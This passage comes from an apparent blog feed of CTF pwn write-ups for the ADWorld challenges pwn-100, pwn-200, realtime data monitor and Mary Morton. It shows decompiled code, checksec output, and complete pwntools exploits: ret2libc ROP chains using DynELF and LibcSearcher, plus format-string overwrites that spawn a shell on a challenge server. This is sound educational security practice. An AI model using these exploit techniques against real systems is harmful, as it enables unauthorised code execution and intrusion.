<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn100&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">47390</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn100&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop1 = <span class="number">0x40075A</span> <span class="comment">#pop rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line">rop2 = <span class="number">0x400740</span> <span class="comment">#rdx(r13), rsi(r14), edi(r15d)</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400763</span></span><br><span class="line"><span class="comment"># start_addr = elf.symbols[&#x27;_start&#x27;]</span></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">binsh_addr = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">      payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">      payload = payload.ljust(<span class="number">200</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">      io.send(payload)</span><br><span class="line">      io.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">      up = <span class="string">&quot;&quot;</span></span><br><span class="line">      content = <span class="string">&quot;&quot;</span></span><br><span class="line">      count = <span class="number">0</span></span><br><span class="line">      <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">          c = io.recv(numb=<span class="number">1</span>, timeout=<span class="number">0.5</span>)</span><br><span class="line">          count += <span class="number">1</span></span><br><span class="line">          <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:</span><br><span class="line">              content = content[:-<span class="number">1</span>] + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">              <span class="keyword">break</span></span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">              content += c</span><br><span class="line">              up = c</span><br><span class="line">      content = content[:<span class="number">4</span>]</span><br><span class="line">      log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (addr, (content <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">      <span class="keyword">return</span> content</span><br><span class="line">      </span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">sys_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;system_addr =&gt; %#x&quot;</span>, sys_addr)</span><br><span class="line">payload  = <span class="string">&quot;a&quot;</span> * <span class="number">0x48</span> + p64(rop1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">8</span>) + p64(binsh_addr) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rop2)</span><br><span class="line">payload += <span class="string">&quot;\x00&quot;</span> * <span class="number">56</span>    </span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload  = payload.ljust(<span class="number">200</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.send(<span class="string">&quot;sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x48</span> + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>Since DynELF cannot search <code>/bin/sh</code> it can only use <code>read()</code> or <code>gets()</code> to read it to the <code>bss</code>.</p>
<h2 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h2><p>Attachment: <a href="/filehost/apcaw/pwn200">pwn200</a><br>Description: None</p>
<p>Similar to <code>pwn-100</code> but a 32-bit. A <code>ret2libc</code> without given <code>.so</code> file again.</p>
<h3 id="Information-3"><a href="#Information-3" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file pwn200</span><br><span class="line">pwn200: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=f73483aa5ece690e61d3f0d76dbf6defce2084ac, stripped</span><br><span class="line">$ checksec pwn200</span><br><span class="line">[*] &#x27;/root/pwn200&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+2Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+30h] [ebp-68h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+34h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+38h] [ebp-60h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+3Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+40h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+44h] [ebp-54h]</span></span><br><span class="line"></span><br><span class="line">  buf = <span class="number">1668048215</span>;</span><br><span class="line">  v2 = <span class="number">543518063</span>;</span><br><span class="line">  v3 = <span class="number">1478520692</span>;</span><br><span class="line">  v4 = <span class="number">1179927364</span>;</span><br><span class="line">  v5 = <span class="number">892416050</span>;</span><br><span class="line">  v6 = <span class="number">663934</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v7, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, (<span class="keyword">char</span> *)&amp;buf);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, &amp;buf, <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;buf));</span><br><span class="line">  <span class="built_in">sub_8048484</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_8048484</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>Dont say so much. <code>ret2libc</code> are always so similar.</p>
<p>Here we use <code>write</code> instead <code>puts</code> to leak function address and calculate <code>libc</code> base address, so the <code>ROP</code> chain should be different.</p>
<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><p>LibcSearcher version:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">47846</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x080484BE</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x6c</span> + p32(<span class="number">0</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(main_addr) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p32(<span class="number">0x4</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(sh.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;start libcsearcher&#x27;</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;base:&#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;/bin/sh:&#x27;</span>+<span class="built_in">hex</span>(bin_sh)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x6c</span> + p32(<span class="number">0</span>) + p32(system_addr) + p32(main_addr)+ p32(bin_sh) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>When meeting multi results, we choose 0: <code>ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</code> instead of 1: <code>ubuntu-trusty-amd64-libc6 (id libc6_2.19-0ubuntu6.14_amd64)</code> and other <code>archive-old-glibc</code>. </p>
<p>DynELF version:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">47846</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn200&#x27;</span>)</span><br><span class="line">write_plt=elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">start_addr=<span class="number">0x080483d0</span></span><br><span class="line">func_addr=<span class="number">0x08048484</span></span><br><span class="line">ppp_addr=<span class="number">0x080485cd</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">        payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(write_plt)+p32(func_addr)+p32(<span class="number">1</span>)+p32(address)+p32(<span class="number">4</span>)</span><br><span class="line">        p.send(payload1)</span><br><span class="line">        data=p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"><span class="built_in">print</span> p.recvline()</span><br><span class="line">d=DynELF(leak,elf=ELF(<span class="string">&#x27;./pwn200&#x27;</span>))</span><br><span class="line">sys_addr=d.lookup(<span class="string">&#x27;__libc_system&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(start_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;bss_addr=&quot;</span>+<span class="built_in">hex</span>(bss_addr)</span><br><span class="line">payload3=<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>+p32(read_plt)+p32(ppp_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">8</span>)+p32(sys_addr)+p32(func_addr)+p32(bss_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>Using DynELF will be faster, so we better learn it.</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>stack-overflow</tag>
        <tag>ctf</tag>
        <tag>canary</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>ADWorld PWN Challenge Area Write-ups (Fmtstr)</title>
    <url>/2020/08/10/2020-08-10-ADWorld-PWN-Challenge-Area-Write-ups-Fmtstr/</url>
    <content><![CDATA[<p>This part is for format string challenges.</p>
<h2 id="realtime-data-monitor"><a href="#realtime-data-monitor" class="headerlink" title="realtime data monitor"></a>realtime data monitor</h2><p>Attachment: <a href="/filehost/apcaw/realtime-data-monitor">realtime-data-monitor</a><br>Description: When Xiao A was scanning a certain pharmaceutical factory, he found a large real-time database system. Xiao A realizes that the real-time database system collects and stores data of thousands of nodes related to industrial processes. As long as you log in, you can get valuable data. In the process of trying to log in to the real-time database system, Xiao A was unable to find a way to modify the login system key. Although she has now collected the value of the key that can log in to the system, she can only find other ways to log in.</p>
<h3 id="Information"><a href="#Information" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file realtime-data-monitor</span><br><span class="line">realtime-data-monitor: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5035740866e7d9977e82b84049f48c683c06fbb9, not stripped</span><br><span class="line">$ checksec realtime-data-monitor</span><br><span class="line">[*] &#x27;/mnt/c/Users/David/Desktop/realtime-data-monitor&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">locker</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>locker</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">locker</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-208h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">512</span>, stdin);</span><br><span class="line">  <span class="built_in">imagemagic</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">0x2223322</span> )</span><br><span class="line">    result = <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">printf</span>(format, &amp;key, key);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>imagemagic</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">imagemagic</span><span class="params">(<span class="keyword">char</span> *format)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>A format string vulnerability in <code>imagemagic()</code> has to be used to overwrite <code>key</code> as <code>0x2223322</code>, and this happens to appear as the last example in <a href="/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/">Format String Vulnerability Intro</a> (to reach <code>Path 3</code>).</p>
<p>There I provided two payloads:</p>
<ol>
<li>the format built on my own –  sort numbers from smallest to largest.</li>
<li>use functions that other people provided –  use integer overflow.</li>
</ol>
<p>Clearly my own payload can solve this kind of challenge, here we have to write <code>0x02</code>, <code>0x22</code>, <code>0x33</code> and <code>0x22</code> to <code>0x0804A048</code>, <code>0x0804A049</code>, <code>0x0804A04a</code> and <code>0x0804A04b</code>, and the basic techniques I have already told  <a href="/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/">before</a>, however we have to get used to using corresponding module to be more effective (just want to slack off).</p>
<p>First we have to determine the parameter order of our input:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./realtime-data-monitor</span><br><span class="line">aaaaaaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</span><br><span class="line">aaaaaaaa,0xf7f862c0,0xfff9ce24,(nil),0xf7f5c000,0xf7f5c000,0xfff9cdd8,0x80484e7,0xfff9cbd0,0x200,0xf7f5c580,0xf7f7556d,0x61616161,0x61616161,0x2c70252c,0x252c7025,0x70252c70</span><br><span class="line">The location of key is 0804a048, and its value is 00000000,not the 0x02223322. (╯°Д°)╯︵ ┻━┻</span><br></pre></td></tr></table></figure>
<p>We can see our input <code>aaaaaaaa</code> locates at the 12th parameter of format string (13th parameter of <code>printf</code> function).</p>
<p>Then use payload to write exploit.</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>It uses some codes&#x2F;functions in the last example of <a href="/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/">Format String Vulnerability Intro</a>.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./realtime-data-monitor&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">48848</span>)</span><br><span class="line">shelf = ELF(<span class="string">&#x27;./realtime-data-monitor&#x27;</span>)</span><br><span class="line">key_addr = <span class="number">0x0804A048</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh.sendline(&#x27;aaaaaaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p&#x27;) # 12th</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target&gt;&gt; i*<span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = fmt_str(<span class="number">12</span>,<span class="number">4</span>,key_addr,<span class="number">0x02223322</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="comment">#print sh.recv() # recvuntil, recvline, ...</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>Using <code>fmtstr_payload</code> of <code>pwntools</code> has the same result. </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">12</span>,&#123;key_addr:<span class="number">0x02223322</span>&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary Morton"></a>Mary Morton</h2><p>Attachment: <a href="/filehost/apcaw/mary_morton">mary_morton</a><br>Description: A very simple warm-up pwn.</p>
<h3 id="Information-1"><a href="#Information-1" class="headerlink" title="Information"></a>Information</h3><p>Check:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file mary_morton</span><br><span class="line">mary_morton: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b7971b84c2309bdb896e6e39073303fc13668a38, stripped</span><br><span class="line">$ checksec mary_morton</span><br><span class="line">[*] &#x27;/root/mary_morton&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:<br><code>main</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">sub_4009FF</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the battle ! &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Great Fairy] level pwned &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Select your weapon &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_4009DA</span>();</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">sub_4008EB</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">      <span class="built_in">sub_400960</span>();</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>In the front of <code>main</code>, <code>sub_4009FF</code> is for setting alarm, <code>sub_4009DA</code> is for printing context.</p>
<p><code>sub_4008EB</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_4008EB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_400960</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-&gt; %s\n&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_4008DA</code> (not in the main logic):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_4008DA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/cat ./flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p>If you run this, you will see the interface and know what the vulnerabilities are:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./mary_morton</span><br><span class="line">Welcome to the battle !</span><br><span class="line">[Great Fairy] level pwned</span><br><span class="line">Select your weapon</span><br><span class="line">1. Stack Bufferoverflow Bug</span><br><span class="line">2. Format String Bug</span><br><span class="line">3. Exit the battle</span><br></pre></td></tr></table></figure>
